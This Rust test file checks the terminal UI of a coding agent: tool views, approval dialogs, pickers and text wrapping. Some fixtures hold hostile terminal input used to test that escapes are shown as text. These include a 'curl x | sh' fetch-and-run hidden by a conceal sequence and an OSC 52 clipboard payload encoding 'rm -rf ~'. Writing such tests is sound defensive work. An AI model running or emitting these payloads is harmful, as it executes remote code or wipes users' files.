//! packages/tui/test/views.test.ts: transcript views and dialogs.

use std::sync::{Arc, Mutex};
use std::time::Instant;

use async_trait::async_trait;
use serde_json::{Value, json};

use sasacode_agent::tool_exec::{ApprovalAnswer, ApprovalRequest};
use sasacode_ai::{AssistantContent, AssistantMessage, JsonObject, ToolCall, UserContent};
use sasacode_host::{harness_note, note_text, set_lang};
use sasacode_plugin_api::{Lang, Tool, ToolContext, ToolKind, ToolRenderer, ToolResult};
use sasacode_tui::dialogs::{ApprovalDialog, CheckList, Dialog, InputDialog, Picker};
use sasacode_tui::keys::Keybindings;
use sasacode_tui::testing::{global_lock, key_event, strip_for_tests};
use sasacode_tui::text::visible_width;
use sasacode_tui::ui::Component;
use sasacode_tui::ui::select_list::SelectItem;
use sasacode_tui::views::{AssistantView, Container, NoteView, Padded, ToolStatus, ToolView, set_expanded};

fn ja() -> std::sync::MutexGuard<'static, ()> {
    let g = global_lock();
    // These assertions quote the Japanese strings.
    set_lang(Lang::Ja);
    g
}

/// SGR codes removed (the TS tests' `plain`).
fn sgr_free(l: &str) -> String {
    let re = regex::Regex::new(r"\x1b\[[0-9;]*m").expect("regex");
    re.replace_all(l, "").into_owned()
}

fn call(id: &str, name: &str, input: Value) -> ToolCall {
    ToolCall {
        id: id.into(),
        name: name.into(),
        input: input.as_object().cloned().unwrap_or_default(),
        raw_input: None,
    }
}

fn press(d: &mut dyn Dialog, id: &str) {
    d.handle_key(&key_event(id), &Keybindings::new());
}

fn type_text(d: &mut dyn Dialog, s: &str) {
    for c in s.chars() {
        let id = if c == ' ' { "space".to_string() } else { c.to_string() };
        press(d, &id);
    }
}

/// The bash tool as the approval sees it: its command is what rules match.
struct FakeBash;

#[async_trait]
impl Tool for FakeBash {
    fn name(&self) -> &str {
        "bash"
    }
    fn description(&self) -> String {
        String::new()
    }
    fn parameters(&self) -> Value {
        json!({})
    }
    fn kind(&self) -> ToolKind {
        ToolKind::Other
    }
    fn match_target(&self, args: &JsonObject) -> Option<String> {
        args.get("command").and_then(Value::as_str).map(str::to_string)
    }
    async fn execute(&self, _args: JsonObject, _ctx: ToolContext) -> anyhow::Result<ToolResult> {
        Ok(ToolResult::default())
    }
}

fn approval(command: &str, reason: &str) -> ApprovalRequest {
    ApprovalRequest {
        tool: Arc::new(FakeBash),
        args: json!({ "command": command }).as_object().cloned().unwrap_or_default(),
        cwd: "/".into(),
        signal: Default::default(),
        call: call("1", "bash", json!({})),
        reason: reason.into(),
    }
}

#[test]
fn a_multi_line_command_stays_on_its_tools_one_header_line() {
    let _g = ja();
    let mut view = ToolView::new(call("1", "bash", json!({})));
    view.summary = "python3 - <<EOF\nglobal s\n\tprint(s)\nEOF".into();
    let header = view.render(80).remove(0);
    assert_eq!(sgr_free(&header), "○ bash(python3 - <<EOF ↵ global s ↵ print(s) ↵ EOF)");
}

#[test]
fn a_long_output_line_wraps_under_its_own_indent() {
    let _g = ja();
    let mut view = ToolView::new(call("1", "ask_user", json!({})));
    view.status = ToolStatus::Done;
    view.output = format!(
        "Q: {}\nA: Postgres\n\nQ: 次",
        "どちらのデータベースを使いますか、".repeat(6)
    );
    let lines: Vec<String> = view.render(40)[1..].iter().map(|l| sgr_free(l)).collect();
    assert!(lines[0].starts_with("  ⎿ Q: どちら"), "{:?}", lines[0]);
    assert!(lines.len() > 4);
    // Every line the long one wraps onto, the answer, and the blank line between keep the indent.
    for l in &lines[1..] {
        assert!(l.starts_with("    "), "{l:?}");
    }
    let trimmed: Vec<&str> = lines.iter().map(|l| l.trim()).collect();
    assert!(trimmed.contains(&"A: Postgres"));
    assert!(trimmed.contains(&""));
    for l in view.render(40) {
        assert!(visible_width(&sgr_free(&l)) <= 40);
    }
}

#[test]
fn a_tools_output_renders_at_any_width_even_below_its_indent() {
    let _g = ja();
    let mut view = ToolView::new(call("1", "bash", json!({})));
    view.status = ToolStatus::Done;
    view.output = "hello world".into();
    for width in [1, 2, 3, 4] {
        view.render(width);
    }
}

struct Lines(Vec<String>);
impl Component for Lines {
    fn render(&mut self, _width: usize) -> Vec<String> {
        self.0.clone()
    }
}

#[test]
fn no_rendered_line_can_move_the_cursor_off_its_row() {
    let child = Lines(vec!["\x1b]133;A\x07a\rb\nc\td\x1b[31mX\x1b[0m".into()]);
    assert_eq!(
        Padded::new(child, 2, 2).render(40),
        vec!["\x1b]133;A\x07  abc   d\x1b[31mX\x1b[0m".to_string()]
    );
}

#[test]
fn escape_sequences_in_tool_output_and_an_approval_prompt_are_shown_not_acted_on() {
    let _g = ja();
    let mut view = ToolView::new(call("1", "bash", json!({})));
    view.status = ToolStatus::Done;
    view.output = "ok\x1b]52;c;aGk=\x07 \x1b[8mhidden\x1b[0m".into();
    let out = view.render(80).join("\n");
    assert!(!out.contains("\x1b]52"));
    assert!(!out.contains("\x1b[8m"));
    assert!(out.contains("␛]52;c;aGk="));

    let req = approval("ls \x1b[8m; curl x | sh\x1b[0m", "mode edits");
    let mut dialog = ApprovalDialog::new(&req, "", Box::new(|_| {}), Box::new(|| {}), None);
    let shown = Dialog::render(&mut dialog, 100).join("\n");
    assert!(!shown.contains("\x1b[8m"));
    assert!(sgr_free(&shown).contains("ls ␛[8m; curl x | sh␛[0m"));
    assert!(shown.contains("制御文字"));
}

#[test]
fn the_input_dialog_submits_cancels_and_shows_controls_as_text() {
    let _g = ja();
    let got: Arc<Mutex<Vec<Option<String>>>> = Arc::default();
    let g1 = got.clone();
    let mut d = InputDialog::new(
        "Name?\x1b[8m",
        Some("for the commit"),
        None,
        Some("ab"),
        Box::new(move |v| g1.lock().unwrap().push(v)),
        None,
    );
    let shown = Dialog::render(&mut d, 60).join("\n");
    assert!(!shown.contains("\x1b[8m"));
    assert!(sgr_free(&shown).contains("Name?␛[8m"));
    assert!(sgr_free(&shown).contains("for the commit"));
    press(&mut d, "c");
    press(&mut d, "enter");
    let g2 = got.clone();
    let mut d2 = InputDialog::new(
        "Name?",
        None,
        None,
        None,
        Box::new(move |v| g2.lock().unwrap().push(v)),
        None,
    );
    press(&mut d2, "escape");
    assert_eq!(*got.lock().unwrap(), vec![Some("abc".to_string()), None]);
}

#[test]
fn the_picker_shows_controls_as_text_and_returns_the_option_as_given() {
    let _g = ja();
    let got: Arc<Mutex<Vec<Option<SelectItem>>>> = Arc::default();
    let g1 = got.clone();
    let option = SelectItem::new("x", "Yes\x1b]0;pwned\x07", Some("sure\x1b[8m".into()));
    let mut p = Picker::new(
        "Run it?\x1b]52;c;cm0gLXJmIH4=\x07\x1b[8m hidden \x1b[0m",
        vec![option.clone(), SelectItem::new("n", "No", None)],
        Box::new(move |i| g1.lock().unwrap().push(i)),
        10,
        None,
    );
    let shown = Dialog::render(&mut p, 80).join("\n");
    assert!(!shown.contains("\x1b]52"));
    assert!(!shown.contains("\x1b]0;"));
    assert!(!shown.contains("\x1b[8m"));
    assert!(sgr_free(&shown).contains("Run it?␛]52;c;cm0gLXJmIH4=␛[8m hidden ␛[0m"));
    assert!(sgr_free(&shown).contains("Yes␛]0;pwned"));
    press(&mut p, "enter");
    assert_eq!(*got.lock().unwrap(), vec![Some(option)]);
}

#[test]
fn the_check_list_toggles_with_space_and_confirms_in_option_order() {
    let _g = ja();
    let got: Arc<Mutex<Vec<Option<Vec<String>>>>> = Arc::default();
    let items = vec![
        SelectItem::new("a", "A", None),
        SelectItem::new("b", "B", None),
        SelectItem::new("c", "C", None),
    ];
    let g1 = got.clone();
    let mut list = CheckList::new(
        "Which?",
        items.clone(),
        &["c".into(), "nope".into()],
        Box::new(move |v| g1.lock().unwrap().push(v)),
        10,
        None,
    );
    assert!(sgr_free(&Dialog::render(&mut list, 60).join("\n")).contains("[x] C"));
    press(&mut list, "space"); // a on
    press(&mut list, "down");
    press(&mut list, "down");
    press(&mut list, "space"); // c off
    press(&mut list, "up");
    press(&mut list, "space"); // b on
    press(&mut list, "enter");
    let g2 = got.clone();
    let mut other = CheckList::new(
        "Which?",
        items,
        &[],
        Box::new(move |v| g2.lock().unwrap().push(v)),
        10,
        None,
    );
    press(&mut other, "escape");
    assert_eq!(
        *got.lock().unwrap(),
        vec![Some(vec!["a".to_string(), "b".to_string()]), None]
    );
}

#[test]
fn dialogs_wrap_a_long_question_and_scroll_it_on_a_short_screen() {
    let _g = ja();
    let question = format!(
        "{}最後まで読めること",
        "認証方式を決める必要があります。既存のセッションCookie方式を残したままJWTを追加するか、置き換えるかを選んでください。".repeat(2)
    );
    let desc = |k: &str| {
        format!(
            "{}説明{k}の終わり",
            "移行は安全だが、認証の実装が二つになり保守の手間が増える。".repeat(3)
        )
    };
    let items = vec![
        SelectItem::new("a", "JWTを追加", Some(desc("A"))),
        SelectItem::new("b", "JWTに置き換え", Some(desc("B"))),
    ];
    let whole = |lines: &[String]| sgr_free(&lines.join(""));
    let fits = |lines: &[String]| lines.iter().all(|l| visible_width(l) <= 80);

    let mut picker = Picker::new(&question, items.clone(), Box::new(|_| {}), 10, None);
    let lines = Dialog::render(&mut picker, 80);
    assert!(fits(&lines));
    assert!(whole(&lines).contains(&question));
    assert!(whole(&lines).contains("説明Aの終わり"));
    press(&mut picker, "down");
    assert!(whole(&Dialog::render(&mut picker, 80)).contains("説明Bの終わり"));

    let lines = Dialog::render(
        &mut InputDialog::new(
            &question,
            Some("理由も書いてください"),
            None,
            None,
            Box::new(|_| {}),
            None,
        ),
        80,
    );
    assert!(fits(&lines));
    assert!(whole(&lines).contains(&question));

    let mut check = CheckList::new(&question, items.clone(), &[], Box::new(|_| {}), 10, None);
    let lines = Dialog::render(&mut check, 80);
    assert!(fits(&lines));
    assert!(whole(&lines).contains(&question));
    assert!(whole(&lines).contains("説明Aの終わり"));

    // On a short screen the question gives way to the choices, and shift+↓ brings its end into view.
    let mut short = Picker::new(
        &format!("{}質問の終わり", question.repeat(3)),
        items,
        Box::new(|_| {}),
        10,
        Some(Box::new(|| 12)),
    );
    let lines = Dialog::render(&mut short, 80);
    assert!(lines.len() <= 12);
    assert!(sgr_free(&lines.join("\n")).contains("JWTに置き換え"));
    assert!(sgr_free(&lines.join("\n")).contains("shift+↑↓"));
    assert!(!whole(&lines).contains("質問の終わり"));
    for _ in 0..10 {
        press(&mut short, "shift+down");
    }
    let lines = Dialog::render(&mut short, 80);
    assert!(lines.len() <= 12);
    assert!(whole(&lines).contains("質問の終わり"));
}

fn message(content: Vec<AssistantContent>) -> AssistantMessage {
    serde_json::from_value(json!({
        "content": content,
        "api": "x",
        "provider": "t",
        "model": "m",
        "usage": sasacode_ai::empty_usage(),
        "stopReason": "aborted",
        "timestamp": 0
    }))
    .expect("message")
}

#[test]
fn a_reply_whose_blocks_shift_is_redrawn_not_crashed_on() {
    let _g = ja();
    let tools: Arc<Mutex<Vec<String>>> = Arc::default();
    let mut v = AssistantView::new(None);
    let c = call("c1", "write", json!({}));
    let thinking: AssistantContent = serde_json::from_value(json!({"type": "thinking", "thinking": "hmm"})).unwrap();
    let text: AssistantContent = serde_json::from_value(json!({"type": "text", "text": "partial answer"})).unwrap();
    let t2 = tools.clone();
    v.update(
        &message(vec![thinking, text.clone(), AssistantContent::ToolCall(c)]),
        &mut |call, _| t2.lock().unwrap().push(call.id.clone()),
    );
    assert_eq!(*tools.lock().unwrap(), vec!["c1".to_string()]);
    // The core settles the same message: thinking without a signature and the half-received call are dropped.
    v.update(&message(vec![text]), &mut |_, _| {});
    let shown = v.render(80).join("\n");
    assert!(shown.contains("partial answer"));
    assert!(!shown.contains("write"));
    assert_eq!(v.len(), 1);
}

#[test]
fn expanded_a_long_diff_line_wraps_so_its_end_can_be_read() {
    let _g = ja();
    let mut view = ToolView::new(call("1", "edit", json!({})));
    view.status = ToolStatus::Done;
    view.diff = Some(format!("-ORIGINAL\n+START{}SECRET_END", "x".repeat(150)));
    assert!(!view.render(80).join("\n").contains("SECRET_END"));
    set_expanded(true);
    let out = sgr_free(&view.render(80).join(""));
    set_expanded(false);
    assert!(out.contains("SECRET_END"));
}

#[test]
fn approval_on_a_short_screen_keeps_the_choices_in_view() {
    let _g = ja();
    let command = format!("printf {}", "x".repeat(1200));
    for (rows, reason) in [
        (10usize, "mode edits".to_string()),
        (22, format!("rule ask: bash({command})")),
    ] {
        let req = approval(&command, &reason);
        let mut dialog = ApprovalDialog::new(
            &req,
            "",
            Box::new(|_| {}),
            Box::new(|| {}),
            Some(Box::new(move || rows)),
        );
        for down in [0, 3] {
            for _ in 0..down {
                press(&mut dialog, "down");
            }
            let lines = Dialog::render(&mut dialog, 80);
            assert!(lines.len() <= rows, "{} > {rows}", lines.len());
            let shown = sgr_free(&lines.join("\n"));
            for choice in [
                "はい",
                "常に許可",
                "いいえ、代わりの指示を伝える",
                "esc で中断",
                "shift+↑↓",
            ] {
                assert!(shown.contains(choice), "{choice} missing in {shown}");
            }
        }
    }
    // Choosing answers once.
    let answers: Arc<Mutex<Vec<ApprovalAnswer>>> = Arc::default();
    let a = answers.clone();
    let req = approval("ls", "mode edits");
    let mut dialog = ApprovalDialog::new(
        &req,
        "",
        Box::new(move |ans| a.lock().unwrap().push(ans)),
        Box::new(|| {}),
        None,
    );
    press(&mut dialog, "down");
    press(&mut dialog, "down");
    press(&mut dialog, "down");
    press(&mut dialog, "enter");
    type_text(&mut dialog, "use rg");
    press(&mut dialog, "enter");
    let got = answers.lock().unwrap().clone();
    assert_eq!(got.len(), 1);
    assert_eq!(got[0].feedback.as_deref(), Some("use rg"));
    assert!(dialog.finished());
}

#[test]
fn expanded_a_long_transcript_is_not_wrapped_again_each_frame() {
    let _g = ja();
    let build = || {
        let mut chat = Container::default();
        for i in 0..100 {
            let mut v = ToolView::new(call(&format!("c{i}"), "bash", json!({ "command": format!("run {i}") })));
            v.status = ToolStatus::Done;
            v.output = (0..500)
                .map(|j| format!("line {j}: R={} 日本語の出力", 5000 - j))
                .collect::<Vec<_>>()
                .join("\n");
            chat.add(Box::new(v));
        }
        Padded::new(chat, 2, 2)
    };
    let mut root = build();
    set_expanded(true);
    let first = root.render(120);
    assert!(first.len() > 50_000);
    let t0 = Instant::now();
    for _ in 0..10 {
        root.render(120);
    }
    let took = t0.elapsed();
    let again = root.render(120);
    let fresh = build().render(120);
    set_expanded(false);
    // Debug builds are slower than bun; the bound is generous but still catches re-wrapping each frame.
    assert!(took.as_millis() < 2000, "{took:?}");
    assert_eq!(again, fresh);
}

#[test]
fn a_tool_view_shows_what_changed_since_its_last_frame() {
    let _g = ja();
    let mut view = ToolView::new(call("1", "bash", json!({ "command": "ls" })));
    view.status = ToolStatus::Running;
    view.live = "one".into();
    assert!(sgr_free(&view.render(60).join("\n")).contains("one"));
    view.live = "one\ntwo".into();
    assert!(sgr_free(&view.render(60).join("\n")).contains("two"));
    view.status = ToolStatus::Done;
    view.output = (0..10).map(|i| format!("out {i}")).collect::<Vec<_>>().join("\n");
    assert!(sgr_free(&view.render(60).join("\n")).contains("+4 lines"));
    set_expanded(true);
    let expanded = sgr_free(&view.render(60).join("\n"));
    set_expanded(false);
    assert!(expanded.contains("out 9"));
    assert!(!sgr_free(&view.render(60).join("\n")).contains("out 9"));
    view.output = format!("{}TAIL", "y".repeat(44)); // 26 columns a line under the indent: TAIL stays whole on the second
    assert!(sgr_free(&view.render(30).join("")).contains("TAIL"));
    view.status = ToolStatus::Error;
    assert!(view.render(30).join("").contains("\x1b[31m"));

    // A tool's own renderer runs once for frames that show the same thing, again when its input is set in place.
    let seen: Arc<Mutex<Vec<JsonObject>>> = Arc::default();
    let s = seen.clone();
    let renderer: ToolRenderer = Arc::new(move |c: &ToolCall, _r: Option<&ToolResult>, _o| {
        s.lock().unwrap().push(c.input.clone());
        Some(vec![format!(
            "path {}",
            c.input.get("path").and_then(Value::as_str).unwrap_or("?")
        )])
    });
    let mut custom = ToolView::new(call("2", "write", json!({})));
    custom.renderer = Some(renderer);
    custom.render(60);
    custom.render(60);
    assert_eq!(seen.lock().unwrap().len(), 1);
    custom.call.input = json!({ "path": "a.ts" }).as_object().cloned().unwrap();
    assert!(sgr_free(&custom.render(60).join("\n")).contains("path a.ts"));
    assert_eq!(seen.lock().unwrap().len(), 2);
}

struct Shared(Arc<Mutex<Vec<String>>>);
impl Component for Shared {
    fn render(&mut self, _width: usize) -> Vec<String> {
        self.0.lock().unwrap().clone()
    }
}

#[test]
fn padding_a_transcript_reuses_unchanged_lines_and_redoes_them_at_a_new_width() {
    let lines = Arc::new(Mutex::new(vec!["a".to_string(), "b\tc".into(), "d".into()]));
    let mut padded = Padded::new(Shared(lines.clone()), 2, 2);
    assert_eq!(padded.render(40), vec!["  a", "  b   c", "  d"]);
    *lines.lock().unwrap() = vec!["a".into(), "b\tc".into(), "e".into()];
    assert_eq!(padded.render(40), vec!["  a", "  b   c", "  e"]);
    let mut narrow = Padded::new(Shared(lines), 2, 2);
    assert_eq!(padded.render(12), narrow.render(12));
}

#[test]
fn a_bundled_plugins_note_to_the_model_is_one_dim_line() {
    let _g = ja();
    let note = UserContent::text(harness_note(
        "Your task list has not been updated for 10 tool calls\nand still reads: ◐ fix bug.",
    ));
    assert!(note_text(&[note.clone(), note.clone()]).is_some_and(|t| t.starts_with("Your task list")));
    assert_eq!(note_text(&[note.clone(), UserContent::text("fix the bug")]), None); // the user's own words: a prompt
    assert_eq!(note_text(&[]), None);
    let lines = NoteView::new(note_text(&[note]).unwrap()).render(40);
    assert_eq!(lines.len(), 1);
    assert!(sgr_free(&lines[0]).starts_with("  ↳ sasacode からモデルへ: Your task"));
}

#[test]
fn user_view_marks_the_prompt() {
    let mut v = sasacode_tui::views::UserView::new(&[UserContent::text("hi")]);
    let lines = v.render(20);
    assert!(lines[0].starts_with("\x1b]133;A\x07"));
    assert!(strip_for_tests(&lines[0]).contains("> hi"));
}
